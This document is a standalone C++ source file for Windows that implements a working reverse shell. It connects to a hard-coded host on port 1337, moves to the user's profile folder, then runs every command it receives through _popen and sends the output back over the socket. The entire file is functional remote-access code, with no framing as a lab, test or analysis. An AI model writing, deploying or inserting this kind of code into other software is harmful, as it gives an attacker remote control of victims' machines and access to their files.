#include <iostream>
#include <stdio.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>
#include <stdlib.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")
void reportErrorToServer(SOCKET serverSocket, const char* errorMessage) {
    send(serverSocket, errorMessage, strlen(errorMessage), 0);
}
int main(int argc, char* argv[]) {
#ifndef _WIN32
    std::cout << "[!] Operating system is not Windows [!]" << std::endl;
    return 1;
#endif

    WSADATA wsadata;
    int result;
    SOCKET client_side;
    struct sockaddr_in client_addr;

    char command[1024];
    char send_command[4096];

    result = WSAStartup(MAKEWORD(2, 2), &wsadata);
    if (result != 0) {
        printf("Error initializing Winsock!\n");
        printf("Error code: %d\n", result);
        return 1;
    }

    client_side = socket(AF_INET, SOCK_STREAM, 0);
    if (client_side == INVALID_SOCKET) {
        printf("Error creating socket!\n");
        printf("Error code: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(1337);
    const char* server_ip = "192.168.1.103"; 
    if (inet_pton(AF_INET, server_ip, &client_addr.sin_addr) != 1) {
        std::cerr << "[!] Invalid address [!]" << std::endl;
        closesocket(client_side);
        WSACleanup();
        return 1;
    }

    result = connect(client_side, (SOCKADDR*)&client_addr, sizeof(client_addr));
    if (result == SOCKET_ERROR) {
        printf("Connection failed!\n");
        printf("Error code: %d\n", WSAGetLastError());
        closesocket(client_side);
        WSACleanup();
        return 1;
    }
    printf("Connection received by client!\n");

    char userProfile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", userProfile, sizeof(userProfile)) == 0) {
        std::cerr << "Failed to get USERPROFILE environment variable!" << std::endl;
        closesocket(client_side);
        WSACleanup();
        return 1;
    }
    if (!SetCurrentDirectoryA(userProfile)) {
        std::cerr << "Failed to set current directory to USERPROFILE!" << std::endl;
        closesocket(client_side);
        WSACleanup();
        return 1;
    }

    while (true) {
        int bytes_received = recv(client_side, command, sizeof(command) - 1, 0);
        if (bytes_received <= 0) {
            printf("Connection closed or error receiving data!\n");
            closesocket(client_side);
            WSACleanup();
            return 1;
        }
        command[bytes_received] = '\0';

        std::string shell_command(command);
        if (shell_command == "exit") {
            printf("Connection closed by client!\n");
            closesocket(client_side);
            WSACleanup();
            break;
        }
        else {
            FILE* pipe = _popen(command, "r");
            if (!pipe) {
                reportErrorToServer(client_side, "Failed to execute command!\n");
                continue;
            }
            std::string result;
            while (fgets(send_command, sizeof(send_command), pipe) != NULL) {
                result += send_command;
            }
            _pclose(pipe);

            int bytes_sent = send(client_side, result.c_str(), static_cast<int>(result.size()), 0);
            if (bytes_sent == SOCKET_ERROR) {
                printf("Error sending data!\n");
                printf("Error code: %d\n", WSAGetLastError());
                closesocket(client_side);
                WSACleanup();
                return 1;
            }
        }
    }

    return 0;
}
